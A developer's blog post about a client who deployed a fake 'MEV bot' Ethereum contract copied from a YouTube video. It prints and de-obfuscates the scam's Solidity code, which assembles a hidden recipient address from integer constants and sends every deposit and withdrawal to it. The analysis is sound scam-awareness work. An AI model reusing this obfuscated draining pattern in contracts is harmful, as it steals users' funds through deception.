---
date: '2024-01-31 12:40:00'
slug: 'the-fascinating-ethereum-mev-bot-scam'
title: 'The fascinating Ethereum MEV Bot scam'
description: 'An overview of this scam contract code'
author: 'veeso'
featured_image: featured.jpeg
category: blockchain
reading_time: '13'
---

## What is a MEV Bot

For those who don't know:

> A MEV bot, short for "Maximal Extractable Value" bot, is a sophisticated program that operates in the cryptocurrency world. It scans the blockchain, which is like a digital ledger of all crypto transactions, looking for chances to make profit. These opportunities come from small differences in prices or from being the first to know about pending transactions. The bot acts super fast, often in milliseconds, to snatch these deals before anyone else can. It's like having a super-fast trader that never sleeps, constantly searching for ways to make money by being the quickest and smartest in spotting and exploiting these fleeting opportunities.

## The backstory

It's been a long time since my last post on this blog, but I had a good chance to post a new story after what happened a few days ago to me.

![were-back](./were-back.gif)

As you may now, I work in different sectors as a software engineer, but I'm particularly specialised in blockchains, and I also receive requests from people asking me to implement little projects on blockchain or to give consultancy.

### The contact

A few days ago I received a call from a man we're going to call **Omar** in this story and what he told me:

> Hi Christian,
>
> So, I have this code here which has been developed by a developer I know. It's a MEV bot and it's working, I see my deposited funds growing but I'm unable to withdraw them. It's not a big deal, I just need you to check the code of the Withdrawal function of the solidity contract.

And here I want to make a premise:

1. I don't know what a **MEV bot** is. So don't expect me here to understand why this was going to be a scam. I know solidity language and I develop Ethereum smart contracts, but I've just heard of MEV bots, but I actually don't know what they do or work. So If I have a customer telling me he has a working MEV bot on a contract he developed, I will believe him.
2. I dind't even think this could be a scam. If someone tells you he has developed an application (or someone did it for him), you would never think this could be turn out in a scam. Who would scam himself?

So I replied

> Okay, send me the code and I'll give it a check, then I'll let you know how much is to fix it

So, he sent me the code.

### The code

It was 6PM and I started to give it a look to the code.

The code is long **477 lines of Solidity** code and internally it contains some apparently complex functions, but I wasn't interested at that. Omar was clear: give a look to the `Withdrawal` function, and check why is not withdrawing the amount of ethereum in the contract.

And so, I headed for it:

```sol
    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function Withdrawal() public payable {
        emit Log("Sending profits back to contract creator address...");
        payable(WithdrawalProfits()).transfer(address(this).balance);
    }
```

This was the code of the **Withdrawal** function. And as you can see, it's not complex at all.
I was quite happy when I saw this code, because I thought, okay it must be easy.

I immediately could see that this code dind't make any sense if Omar wanted to withdraw ETH to his account, at least unless
`WithdrawalProfits()` would returns his address, but it didn't.

So I thought, okay, let's just add `Ownable` to the contract, so we can register the address of the deployer as the owner and let's just replace the line with

```sol
address payable ownerAddress = payable(Ownable.owner());
ownerAddress.transfer(address(this).balance);
```

Pretty easy, right?

I didn't test the rest of the code because, as I said before, he showed me the contract had plenty of balance inside, so I thought the entire logic was working, so I just tested that line, and yes, it actually withdrawn the balance to the owner.

So the next day we tested it together, and at this point, something started to go very wrong.

### The non-deploy

The next day I called him and he shared me his screen and he head to Remix to load the new code.
Okay, great I thought. So I loaded my code into the editor and I asked him if he was ready to deploy.

And at this point he replied me that we didn't have to, we could just load to the existing contract he had.

I immediately thought that was strange, because every one who has developed with Ethereum knows that contracts are immutable, once the code is deployed, you cannot change it. If you want to update the code, you need to deploy a new contract and point your existing application to it.

I started to understand that maybe Omar wasn't experienced with development at all. But the code was developed by someone else for him, so what could go wrong?

![what-could-possibly-go-wrong](./what-could-possibly-go-wrong.gif)

I explained him how Ethereum works with updates and he said "Ok, let's do it", but when he saw the fee he had to pay to re-deploy he was reluctant to proceed. I explained him that given the size of the code and the current gas fees, that was pretty normal, so I told him "Well, let's just see how much you spent the last time", so we headed to its address on etherscan and there, I started to see strange things.

He gave me the code of the address of the smart contract he deployed, but I couldn't see any `Contract creation` transaction, also he told me it was deployed 13 days before, but the contract had transactions older than 180 days.

What was going on?

### And it was at that moment I knew

I looked at the top of the page, and etherscan said it wasn't a contract, but a **wallet address**.
So I started to suspect that **MAYBE**, he was sending his ether to someone else.

![i-knew](./i-knew-it.gif)

And I know what you're thinking right now

> But veeso, how didn't you figure it out before this was going to be a scam case?

Well, the reason is quite simple: he told me **he had this code done for him**. So I couldn't expect a scam.
If you're sure that something is safe, you could never think it cannot be.

There is actually in the human nature, it's called **confirmation bias**:

> Confirmation bias: Favoring information that confirms pre-existing beliefs.

**I had no reason not that trust the code**, as I said before.

I was finally able to actually find the contract address and I immediately noticed, the contract value was zero. And it had never increased before. The only two instance the balance changed was when he deposited the initial amount and when `Withdrawal` was called.

So I couldn't do more than ask him:

> May I ask you, where did you get this code from, actually?

And the answer, was exactly what I was expecting at this point:

> In a youtube video.

Just for the record, the video is called `how to make $1000 with web3`, which if you ask me is a huge red flag.
The guy even put the face in the video, but if you ask me probably is not him, but someone else and the voice is added and maybe edited, because the rest of the cannel videos are priceless content such as `learn css in 12 minutes` or `learn php in 15 minutes` where he basically shows how to echo in a HTML file. Wow, quality content.

![quality-content](./quality-content.gif)

At this point I couldn't do much, if not telling Omar this was a scam and that all the funds he sent were headed to another ethereum address and there's now way for him to recover them.

![it-was-over](./it-was-over.gif)

Honestly, I feel really bad about this story, because platforms like Youtube will demonetize or ban your video if you say `murder`, but if you post a video to scam hundreds of people they won't even check the title and on the other hand I still really feel concerned about people thinking that making money with web3 is just a matter of copy-pasting smart contracts or depositing money in some airdrop honeypot.

I know it's not my target audience, but if you ever encounter one miracoulous smart contract, please

1. consider it at 99% a scam
2. if you're still going to trust it, PLEASE, ask a review to a software engineer first. A code check from an expert is extremely cheap and it will make you save a lot of money.

## But we are here for the science

I know you're here for there science.
You want to know what this 477 lines long contract was doing, and I'm here for you.

Because you actually may expect it to just send the ethereum to a address written in a string, but actually it's not that simple.
And just for the record, I'm not the first one bringing this topic, but a very good video was done on Youtube by Tech Addict. You can find it [on its channel](https://www.youtube.com/watch?v=ZRzzLAMblOA).

![here-for-the-science](./for-the-science.gif)

The contract starts importing some code from Uniswap, which may make you think that it actually does some arbitrage, but this code is actually never used. So we can actually forget about that.

```sol
pragma solidity ^0.6.12;



import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol";
import "https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol";
import "https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/LiquidityMath.sol";
```

The constructor takes two arguments, which are network and router address, but fun fact, they are completely useless and never used, so forget also about that.

```sol
constructor(string memory Network, string memory routerAddress) public {

        /*ETH
        /*The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D


        /BSC
        /Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E

        /Network: ETH or BSC
        */

        _Network = Network;
        _RouterAddress = routerAddress;
    }
```

Then the users are asked to call `Start` which does this

```sol
    /*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function Start() public payable {
        emit Log("Running MEV action. This can take a while; please wait..");
        payable(_callMEVAction()).transfer(address(this).balance);
    }
```

It doesn't do much, it just receives some Ethers from the caller and send to the address returned by `_callMEVAction()`, which will be soon appear as the core of the scam.

You may think this was ridicolous, and it is, but in good faith, I could think

> Okay, maybe it sends the ether to some address and then the contract which receives the ether will do something and then send the gains back to this MEV bot.

It's not so unlikely to work like that, especially because ethereum smart contracts cannot perform tasks in the background, so it really doesn't sound so dumb to me.

To be honest, though, the `Stop` function was more concerning

```sol
function Stop() public payable { Log("Stopping contract bot...");
    }
```

Yeah, it won't do anything.

And finally, when you see your gains growing, you can call Withdrawal

```sol
/*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function Withdrawal() public payable {
        emit Log("Sending profits back to contract creator address...");
        payable(WithdrawalProfits()).transfer(address(this).balance);
    }
```

Which will send the contract balance to `WithdrawalProfits()`, which as we've already seen before, won't send the money back to the contract owner, but to someone else.

Then I know you want to know what `WithdrawalProfits()` and `_callMEVAction()` returns, so let's see.

```sol
    function WithdrawalProfits() internal pure returns (address) {
        return parseMempool(callMempool());
    }

    function _callMEVAction() internal pure returns (address) {
        return parseMempool(callMempool());
    }
```

Uhm, okay? So no matter whether you're depositing or withdrawing, it will always send to the same result.

![suspicious](./suspicious.gif)

```sol
    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function parseMempool(string memory _a) internal pure returns (address _parsed) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;

        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }
```

`Parsing all Uniswap mempool`.

![i dont know rick](./rick.gif)

Okay now this looks complex, but is it? If you're a bit experienced with ascii, this code will just convert a string into the hex values it represents.

What I mean is, if you pass the address `0xb90ab45828385996990e173e8541e0c93a8eae20` this function will just

1. remove `0x`
2. convert each two chars into the hex value

such as `"b9"` to `0xb9`, etc and returns the address from it.

But what about `callMempool()` then

```sol
    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 34273765033; //mempool solidity update
        uint _memPoolLength = 182132094; //lenght update
        uint _memPoolSize = 4038354462; //size update
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolDepth = getMemPoolDepth();

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth);

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }
```

Ok, it looks like it's doing some very complex stuff.
Spoiler alert: it is not.

First of all we can see there is a lot of `checkLiquidity` here, which just for the record, is implemented as follows

```sol
/*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }
```

the description says `Check if contract has enough liquidity available`.

![yeah-sure](./yeah-sure.gif)

But what it actually does is, given a number, it returns the hex representation of it as a string.

Then we have the `mempool` function

```sol
  /*
     * @dev loads all Uniswap/Pancakeswap with (RouterAddress) mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
```

Which states to `loads all Uniswap/Pancakeswap with (RouterAddress) mempool into memory`, but actually it just concatenates two strings.

And finally we got a final function which is

```sol
function getMemPoolOffset() internal pure returns (uint) {
  return 16333329;
}
```

Okay, I guess.

So, if you give a closer look to callMempool, the result will never change, so let's computate it step-by-step:

```sol
    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function callMempool() internal pure returns (string memory) {
        string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
        uint _memPoolSol = 34273765033; //mempool solidity update
        uint _memPoolLength = 182132094; //lenght update
        uint _memPoolSize = 4038354462; //size update
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolDepth = getMemPoolDepth();

        string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
        string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
        string memory _memPool3 = checkLiquidity(_memPoolHeight);
        string memory _memPool4 = checkLiquidity(_memPoolDepth);

        string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
        string memory _fullMempool = mempool("0", _allMempools);

        return _fullMempool;
    }
```

But now that we know what this code does, we could just rewrite it as

```sol
function scammerAddress() internal pure returns (string memory) {
  string memory addr0 = concatStrings("x", hexRepr(16333329));

  string memory addr1 = concatStrings(addr0, hexRepr(34273765033));
  string memory addr2 = concatStrings(hexRepr(182132094), hexRepr(4038354462));
  string memory addr3 = hexRepr(711911); // it was mempool height return
  string memory addr4 = hexRepr(237486); // it was mempool depth return

  string memory addressString = concatStrings(concatStrings(addr1, addr2), concatStrings(addr3, addr4));
  string memory fullAddress = concatStrings("0", addressString);

  return fullAddress;
}
```

So step-by-step:

1. `addr0=xF93A11`
2. `addr1=xF93A117FAE026A9`
3. `addr2=ADB1D7EF0B4661E`
4. `addr3=ADCE7`
5. `addr4=39FAE`
6. `addressString=xF93A117FAE026A9ADB1D7EF0B4661EADCE739FAE`

And so the result is `0xF93A117FAE026A9ADB1D7EF0B4661EADCE739FAE`.

Oh, and did you read the description? `Iterating through all mempool to call the one with the with highest possible returns`.
Of course, the highest possible returns (for them)!

Quite fun to analyze, but yeah, eventually it's really sad.

![joe-nods](./joe-nods.gif)
